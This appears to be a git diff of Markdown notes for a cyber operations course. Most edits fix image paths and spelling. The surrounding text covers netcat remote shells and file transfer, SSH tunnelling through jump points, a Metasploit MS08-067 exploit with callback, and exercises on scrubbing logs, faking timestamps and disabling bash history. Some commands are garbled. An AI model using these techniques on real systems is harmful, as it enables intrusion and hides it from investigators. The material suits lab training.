@@ -56,14 +56,14 @@ Network File System | NFS | TCP / UDP 2049, 111
 
 * Open a listening port on your Windows 7 VM
   * Don't forget to check your syntax  
-    ![NetCat Listener](./Files/CTE-Week4/Images/NetCat-Listener.jpg)
+    ![NetCat Listener](./Files/Images/NetCat-Listener.jpg)
 * Connect to Windows 7 VM from CentOS
-    ![NetCat Listener](./Files/CTE-Week4/Images/NetCat-Listener2.jpg)
+    ![NetCat Listener](./Files/Images/NetCat-Listener2.jpg)
 
 ### Using Netcat to Get a Remote Shell
 
 * Use the -e option to execute a program after connection
-    ![NetCat Listener](./Files/CTE-Week4/Images/NetCat-Listener3.jpg)
+    ![NetCat Listener](./Files/Images/NetCat-Listener3.jpg)
 * Ensure the nc version you are using has the —e option.
 
 ### Transferring Files With Netcat
@@ -71,12 +71,12 @@ Network File System | NFS | TCP / UDP 2049, 111
 * Receiver sets up listener; sender calls forward
   * Destination: `nc -l <dst port> > <filename>`
   * Source: `nc 10.0.2.2 <dst_port < <filename>`
-  ![NetCat File Transfer](./Files/CTE-Week4/Images/NetCat-File-Transfer.jpg)
+  ![NetCat File Transfer](./Files/Images/NetCat-File-Transfer.jpg)
 * Reverse transfer
   * Sender sets up listener; receiver calls back
   * Source: `nc -1 <src port > < <filename>`
   * Destination: `nc <src_ip> <src_port> <filename>`
-    ![NetCat File Transfer](./Files/CTE-Week4/Images/NetCat-File-Transfer2.png)
+    ![NetCat File Transfer](./Files/Images/NetCat-File-Transfer2.png)
 
 ### Socat
 
@@ -110,7 +110,7 @@ Network File System | NFS | TCP / UDP 2049, 111
 
 ___
 
-## Exersise - Module 2, Lesson 7 – File Transfers
+## Exercise - Module 2, Lesson 7 – File Transfers
 
 ___
 
@@ -304,7 +304,7 @@ ___
 
 ### Tunnel Diagrams
 
-![Tunnel Diagram](./Files/CTE-Week4/Images/tunnel1.png)
+![Tunnel Diagram](./Files/Images/tunnel1.png)
 
 * First line shows SSH connection:
   * Single dash (----) represents a TCP connection
@@ -327,7 +327,7 @@ ___
 
 ### SSH Into Remote Machine
 
-![SSH Tunnel](./Files/CTE-Week4/Images/tunnel2.png)
+![SSH Tunnel](./Files/Images/tunnel2.png)
 
 * Connect to redirector, setup tunnel with redirector:
   * `ssh administrator@192.168.10.3 -L5555:192.168.108:22`
@@ -346,7 +346,7 @@ ___
   * -gL14560:192.168.100.4:22
   * L0.0.0.0:14560:192.168.100.4:22
 
-![Multiple SSH Tunnels](./Files/CTE-Week4/Images/tunnel3.png)
+![Multiple SSH Tunnels](./Files/Images/tunnel3.png)
 
 * Set up a tunneon on CentOS VM:  
   * `ssh root@192.168.10.7 -gL14560:192.168.100.4:22`
@@ -356,7 +356,7 @@ ___
 
 ### FTP Into Remote Machine
 
-![FTP over SSH Tunnels](./Files/CTE-Week4/Images/ftp1.png)
+![FTP over SSH Tunnels](./Files/Images/ftp1.png)
 
 * Set up tunnel:
   * `ssh root@192.168.10.7 -L3342:192.168.10.8:21`
@@ -374,7 +374,7 @@ ___
 
 ### Using Two Hops
 
-![Multiple Hop SSH Tunnel](./Files/CTE-Week4/Images/tunnel4.png)
+![Multiple Hop SSH Tunnel](./Files/Images/tunnel4.png)
 
 * Connection to first redirector and first tunnel:
   * `ssh administrator@192.168.10.4 -L 35261: 192.168.10.7:22`
@@ -414,7 +414,7 @@ ___
 
 ### Basic Port Forwarding
 
-![Reverse Tunnel](./Files/CTE-Week4/Images/ReverseTunnel1.png)
+![Reverse Tunnel](./Files/Images/ReverseTunnel1.png)
 
 * SSH is already running on your machine
 * Set up tunnel:
@@ -424,7 +424,7 @@ ___
 
 ### Reverse Tunnel Diagram
 
-![Reverse Tunnel Diagram](./Files/CTE-Week4/Images/ReverseTunnel2.png)
+![Reverse Tunnel Diagram](./Files/Images/ReverseTunnel2.png)
 
 * Set up tunnel on Win7 physical:
   * `ssh root@192.168.10.5 -R24981:127.0.0.1:6677`
@@ -435,7 +435,7 @@ ___
 
 ### Multiple Hops: Reverse Tunnel
 
-![Reverse Tunnel Diagram](./Files/CTE-Week4/Images/ReverseTunnel3.png)
+![Reverse Tunnel Diagram](./Files/Images/ReverseTunnel3.png)
 
 ### Additional Tunnels
 
@@ -451,7 +451,7 @@ ___
 
 ___
 
-## Exersise - Module 2, Lesson 7 – Tunneling and Data Exfiltration
+## Exercise - Module 2, Lesson 7 – Tunneling and Data Exfiltration
 
 ___
 
@@ -459,7 +459,7 @@ ___
 
 1. Draw a diagram of the tunnels that will be created. Indicate the client connection created by the beacon on the diagram and document the command used to set up the netcat listener that will receive the communications.
 
-![Exersise Diagram](./Files/CTE-Week4/Images/TunnelExercise.png)
+![Exercise Diagram](./Files/Images/TunnelExercise.png)
 
 2. Set up the netcat listener.  
   On Win10 - `nc -l -p 6677`  
@@ -540,9 +540,9 @@ ___
 ### Sample UNIX Log Entries
 
 * Very Secure FTP log file  
-![Secure FTP](./Files/CTE-Week4/Images/Lesson8/SecureFTP.jpg)
+![Secure FTP](./Files/Images/Lesson8/SecureFTP.jpg)
 * `/var/log/secure`  
-![Secure FTP](./Files/CTE-Week4/Images/Lesson8/var-log-secure.png)  
+![Secure FTP](./Files/Images/Lesson8/var-log-secure.png)  
 
 ### Windows Event Logs  
 
@@ -653,7 +653,7 @@ Winrm 2.x | Default ports: HTTP/Port 5985 or HTTPS/Port 5985
 * Security audit policies can also be viewed using the command line via the auditpol . exe command
 * `auditpol.exe /get /category: *`
 
-![AutditPol](./Files/CTE-Week4/Images/Lesson8/auditpol.jpg)
+![AutditPol](./Files/Images/Lesson8/auditpol.jpg)
 
 ### Server Log Files
 
@@ -668,9 +668,9 @@ Winrm 2.x | Default ports: HTTP/Port 5985 or HTTPS/Port 5985
 ### Apache Web Server Logs
 
 * Access logs — contains information about request coming to the web server
-![Apache Web Server](./Files/CTE-Week4/Images/Lesson8/apache-web-server-log1.png)
+![Apache Web Server](./Files/Images/Lesson8/apache-web-server-log1.png)
 * Error logs — contains information about errors encountered by the server
-![Apache Web Server](./Files/CTE-Week4/Images/Lesson8/apache-web-server-log2.png)
+![Apache Web Server](./Files/Images/Lesson8/apache-web-server-log2.png)
 
 ### Apache Web Server logs location
 
@@ -718,12 +718,12 @@ LogLevel | /etc/apache2/sysconfig.d/global.conf | warn
   * `C:\Windows\system32\LogFiles\W3SVC1`
 * WC3 Extended Log File Format
 
-![IIS Web Server WC3 Log](./Files/CTE-Week4/Images/Lesson8/IIS-Log1.png)
+![IIS Web Server WC3 Log](./Files/Images/Lesson8/IIS-Log1.png)
 
 * Microsoft IIS Logging Formats
   * IIS Log File Format
 
-![IIS Web Server WC3 Log](./Files/CTE-Week4/Images/Lesson8/IIS-Log2.png)
+![IIS Web Server WC3 Log](./Files/Images/Lesson8/IIS-Log2.png)
 
 * Microsoft IIS Logging Formats
   * NCSA Common Log File Format
@@ -844,25 +844,25 @@ Reference.
 
 * The newfile.txt file contains a list of IP addresses. We want to remove IP 10.0.100.70 from newfile.txt and then change time/date of file to original date and time.
 
-![findstr1](./Files/CTE-Week4/Images/Lesson8/findstr2.jpg)
-![findstr2](./Files/CTE-Week4/Images/Lesson8/findstr1.jpg)
+![findstr1](./Files/Images/Lesson8/findstr2.jpg)
+![findstr2](./Files/Images/Lesson8/findstr1.jpg)
 
 * Use the move command to overwrite the contents of the original file.
-![findstr3](./Files/CTE-Week4/Images/Lesson8/findstr3.jpg)
+![findstr3](./Files/Images/Lesson8/findstr3.jpg)
 
 ### Windows timestamp Command
 
 * Use the timestomp command to return the file to its original date and time.
-![Timestop](./Files/CTE-Week4/Images/Lesson8/TimeStop.jpg)
+![Timestop](./Files/Images/Lesson8/TimeStop.jpg)
 
 ### Cleaning Logs: Always Use Multicommand Script
 
-![MultiCommand](./Files/CTE-Week4/Images/Lesson8/Multicommand1.jpg)
-![MultiCommand](./Files/CTE-Week4/Images/Lesson8/Multicommand2.jpg)
+![MultiCommand](./Files/Images/Lesson8/Multicommand1.jpg)
+![MultiCommand](./Files/Images/Lesson8/Multicommand2.jpg)
 
 ### Windows Modify File Timestamp With timestomp
 
-![Modify Timestamp](./Files/CTE-Week4/Images/Lesson8/TimeStomp2.jpg)
+![Modify Timestamp](./Files/Images/Lesson8/TimeStomp2.jpg)
 
 ### Unix Log Cleaning
 
@@ -881,7 +881,7 @@ touch -t <date_and_time> secure
 
 ### UNIX: Modify File Timestamp with touch Command
 
-![Touch Command](./Files/CTE-Week4/Images/Lesson8/Touch1.jpg)
+![Touch Command](./Files/Images/Lesson8/Touch1.jpg)
 
 ### Syslog
 
@@ -896,11 +896,11 @@ touch -t <date_and_time> secure
 
 ### Syslog Configuration File
 
-![Syslog](./Files/CTE-Week4/Images/Lesson8/Syslog1.jpg)
+![Syslog](./Files/Images/Lesson8/Syslog1.jpg)
 
 ### Centralized Log Management
 
-![Splunk](./Files/CTE-Week4/Images/Lesson8/Splunk.jpg)
+![Splunk](./Files/Images/Lesson8/Splunk.jpg)
 
 ### Redirection
 
@@ -914,47 +914,47 @@ touch -t <date_and_time> secure
 
 ### Redirection via SSH Tunnels
 
-![Redirection via SSH Tunnels](./Files/CTE-Week4/Images/Lesson8/Redirection-SSHTunnels.png)
+![Redirection via SSH Tunnels](./Files/Images/Lesson8/Redirection-SSHTunnels.png)
 
 ### SSH Tunnel and Meterpreter Options
 
-![SSH Tunnels](./Files/CTE-Week4/Images/Lesson8/SSHTunnels.png)
+![SSH Tunnels](./Files/Images/Lesson8/SSHTunnels.png)
 
 ### Example 1 : Preparing the Payload
 
-![Example 1](./Files/CTE-Week4/Images/Lesson8/SSHTunnels-Example1.jpg)
+![Example 1](./Files/Images/Lesson8/SSHTunnels-Example1.jpg)
 
 ### Example 1 : Bad Tradecraft
 
-![Bad Tradecraft](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft.png)
+![Bad Tradecraft](./Files/Images/Lesson8/bad-tradecraft.png)
 
 ### Redirection Tunnel Example
 
-![Redirectio Tunnel](./Files/CTE-Week4/Images/Lesson8/Redirection-SSHTunnel-example.png)
+![Redirectio Tunnel](./Files/Images/Lesson8/Redirection-SSHTunnel-example.png)
 
 ### Bad Tradecraft Example 2
 
-![Bad Tradecraft 2](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft-2.jpg)
-![Bad Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/bad-tradecraft2.png)
+![Bad Tradecraft 2](./Files/Images/Lesson8/bad-tradecraft-2.jpg)
+![Bad Tradecraft Example](./Files/Images/Lesson8/bad-tradecraft2.png)
 
 ### Redirection Tunnel Example 2
 
-![Redirection Tunnel Example](./Files/CTE-Week4/Images/Lesson8/Redirection-Tunnel-example.jpg)
+![Redirection Tunnel Example](./Files/Images/Lesson8/Redirection-Tunnel-example.jpg)
 
 ### Good Tradecraft Example
 
-![Good Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/good-tradecraft-1.jpg)
-![Good Tradecraft Example](./Files/CTE-Week4/Images/Lesson8/good-tradecraft-1.png)
+![Good Tradecraft Example](./Files/Images/Lesson8/good-tradecraft-1.jpg)
+![Good Tradecraft Example](./Files/Images/Lesson8/good-tradecraft-1.png)
 
 ### Initial SSH Tunnel with Jump Point
 
-![Inital Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-inial-connection.png)
+![Inital Conneciton](./Files/Images/Lesson8/tunnel-inial-connection.png)
 
 * `ssh root@10.20.30.40 -L 11111:20.30.40.50:445 -R 80:127.0.0.1.80`
 
 ### Outbound Trigger: Target1
 
-![Target1 Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-target1-connection.png)
+![Target1 Conneciton](./Files/Images/Lesson8/tunnel-target1-connection.png)
 
 ```msf
 msf > us eploit/windows/smb/ms08_067_netapi
@@ -971,10 +971,63 @@ msf exploit(ms08_067_netapi) > exploit
 
 ### Connection and Callback
 
-![Callback Conneciton](./Files/CTE-Week4/Images/Lesson8/tunnel-callback-connection.png)
+![Callback Conneciton](./Files/Images/Lesson8/tunnel-callback-connection.png)
 
 * Meterpreter box is still listening on 11111 (forward SSH tunnel).
 * Jump poin is still listening (as well as conneted) on 80 (Reverse SSH) tunnel
 * `ssh root@10.20.30.40 -L11111:20.30.40.50:445 -R 80:127.0.0.1:`
 
-## Module 2, Lesson 8 – Threat Emulation Actions in Logs
+## Exercise Module 2, Lesson 8 – Threat Emulation Actions in Logs
+
+___
+
+### Senario 1 - Manipulate logs
+
+1. Log in to the jump point to identify and remove any log entries relating specifically to SSH connections the attack machine makes.
+2. Before opening any log files, run the file command against the log file to determine if it is ASCII text and therefore human readable.
+3. Log in to the Kali machine and SSH into the jump point machine.
+4. Execute the command that will record the information resulting from the session created from the attack machine to the jump point.
+5. Once you are connected to the jump point, switch to the directory that holds most of the logging information for the jump point.  
+6. Identify all human readable logs in the current directory especially those that might contain SSH session entries.
+7. Run the commands that allow you to view SSH session related information in logs, whether they are in human or non-human readable format.
+8. Run the commands that will clean the relevant log files.
+9. Run the command that changes the time on the cleaned logs to match the last remaining entry.
+10. What should you do if all of the logs entries need to be cleaned? Select one or more:
+a. Delete the entries
+b. Modify the time to a zero byte file
+c. Modify the time to match any other file in the folder
+d. Comment out the entries
+11. Explain why an attacker should adjust the time on a log that has been changed and discuss why an investigator should review logs for mismatching times.
+12. Write down the command that will display the bash command history of the intern and root users on the jump point.
+13. How might an investigator might use the bash history information?
+14. Why a hacker would want to remove entries/artifacts from the bash_ history file?
+15. Write down the command that prevents the system from writing to the bash history file.
+16. Explain why an attacker should use a jump point rather than directly exploiting the box
+17. Delete any files created during the SSH session, then close the SSH connection to the jump point.
+
+### Part 2: Investigate a target remotely
+
+1. Which implant is typically preferred on a target system? Select one:
+  a. Callback
+  b. Listener
+  c. Payload
+  d. Exploit
+2. List the benefits and drawbacks of:
+  a. listeners
+  b. callback implants
+  c. non-persistent implants
+  d. a persistent implant
+3. Why shouldn’t you use port 445 as the callback destination port?
+4. When considering the four ports:
+  • destination
+  • source
+  • ephemeral
+  • local
+and their possible states:
+  • open
+  • closed
+  • mode
+  • established
+Select the above choices to make this statement true:
+To exploit a vulnerable service, the <> must be <> .
+
